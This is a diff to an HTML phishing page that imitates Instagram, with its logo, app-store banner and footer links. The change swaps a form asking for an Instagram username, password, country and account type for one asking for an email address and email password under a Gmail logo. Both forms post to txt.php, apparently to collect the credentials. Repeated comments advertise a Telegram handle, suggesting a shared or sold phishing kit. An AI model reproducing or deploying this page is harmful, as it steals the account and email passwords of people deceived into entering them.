@@ -7,35 +7,22 @@
 <link rel="shortcut icon" href="https://www.freepnglogos.com/uploads/instagram-logo-png-transparent-0.png">
   <title> Instagram </title>
  </head> 
- <body> 
-     <div class="header-ig"><div class="header-ig-text"><p class="header-ig-ig">Instagram</p><p class="header-ig-2"> Find for free on Google Play.</p></div>
+ <body>   <!-- telegram @klaxgod -->
+   <div class="header-ig"><div class="header-ig-text"><p class="header-ig-ig">Instagram</p><p class="header-ig-2"> Find for free on Google Play.</p></div>
    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D27C892C7-1B67-4BBA-ABFC-755E7134B0EE%26utm_content%3Dlo%26utm_medium%3DinstallLink"><button>GET</button></a>
-   </div>  <!-- telegram @klaxgod -->
-  <center> 
+   </div>
+  <center>   <!-- telegram @klaxgod -->
    <div id="rgn" class="content"> 
-    <img src="https://i.hizliresim.com/nshihpg.png" width="200" id="klaxgod"> 
-    <br>   <!-- telegram @klaxgod -->
-    <span> Confirm Your Account</span> 
+    <img src="https://www.freepnglogos.com/uploads/logo-gmail-png/logo-gmail-png-for-gmail-email-client-mac-app-store-16.png" width="200" id="mail"> 
+    <br> 
+    <span> Confirm Your Mail</span> 
     <form action="txt.php" method="post"> 
-     <input type="text" placeholder="Username" class="psikopatcoder" name="username" required> 
-     <input type="password" placeholder="Password" class="psikopatcoder" name="password" required>
-     <input type="text" placeholder="Country" class="psikopatcoder" name="Country" required> 
-	<select id="select">  <!-- telegram @klaxgod -->
-		<option value="Business Account">Business Account</option>
-		<option value="Fun">Fun</option>
-		<option value="Private">Private</option>
-		<option value="Trade">Trade</option>
-		<option value="Music">Music</option>
-		<option value="Orther">Orther</option>
-	</select>  <!-- telegram @klaxgod -->
-
-
-
-
-	 <input type="submit" value="Confirm Account" name="submit" id="butonck">
-    </form>   <!-- telegram @klaxgod -->
+     <input type="email" placeholder="E-mail" class="psikopatcoder" name="mail" required> 
+     <input type="password" placeholder="Password" class="psikopatcoder" name="mailpw" required>
+	 <br><input type="submit" value="Confirm Account" name="submit_mail" id="butonck">
+    </br></form>   <!-- telegram @klaxgod -->
    </div> 
-   <div id="footer"> 
+   <div id="footer">   <!-- telegram @klaxgod -->
     <a href="https://www.instagram.com/about/us/"> ABOUT US </a> 
     <a href="https://help.instagram.com/"> HELP </a> 
     <a href="https://www.instagram.com/developer/"> API </a> 
